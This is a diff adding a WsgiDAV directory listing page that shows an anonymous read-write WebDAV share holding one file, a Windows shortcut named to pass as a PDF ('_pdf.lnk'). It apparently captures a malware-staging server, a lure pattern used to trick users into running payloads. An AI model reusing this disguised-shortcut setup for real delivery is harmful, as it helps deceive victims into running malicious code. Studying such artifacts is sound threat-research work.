@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta name="generator" content="WsgiDAV/4.3.0">
+  <title>WsgiDAV - Index of /EBSYA93840BNVADSFA/ </title>
+  <link rel="shortcut icon" href="/:dir_browser/favicon.ico">
+  <link rel="stylesheet" href="/:dir_browser/style.css" />
+  <script defer src="/:dir_browser/script.js"></script>
+  <style type="text/css"> A {behavior: url(#default#AnchorClick);} </style>
+</head>
+
+<body onload="onLoad()">
+
+  <h1>
+    <img class="logo" alt="WsgiDAV" title="WsgiDAV" src="/:dir_browser/logo.png">
+    Index of /EBSYA93840BNVADSFA/
+  </h1>
+
+  
+  <p class="auth-user">
+    Authenticated user: "anonymous", realm: "/", access: read-write.</p>
+  <hr>
+
+  <table class="dir-listing" onclick="return onClickTable(event)">
+
+    <colgroup>
+      <col>
+      <col>
+      <col class="right">
+      <col class="right">
+    </colgroup>
+
+    <thead>
+      <tr>
+        <th>Name</th>
+        <th>Type</th>
+        <th>Size</th>
+        <th>Last modified</th>
+      </tr>
+    </thead>
+
+    <tbody>
+      <tr class="directory">
+          <td>
+            <a href="..">..</a>
+          </td>
+        <td>Directory</td>
+        <td>-</td>
+        <td></td>
+      </tr>
+      
+      <tr class="">
+        <td>
+          <a class="" href="EBSYA93840BNVADSFA_pdf.lnk"  >
+              EBSYA93840BNVADSFA_pdf.lnk
+          </a></td>
+        <td>LNK-File</td>
+        <td>1,956 Bytes</td>
+        <td>Fri, 29 Nov 2024 09:12:01 GMT</td>
+      </tr>
+      
+    </tbody>
+  </table>
+
+  <hr>
+
+  
+  <p class="trailer"><a href='https://github.com/mar10/wsgidav/'>WsgiDAV/4.3.0</a> - Fri, 29 Nov 2024 15:38:19 GMT</p>
+  
+
+  <object id="winFirefoxPlugin" type="application/x-sharepoint"
+      width="0" height="0" style="visibility: hidden;"></object>
+
+</body>
+</html>
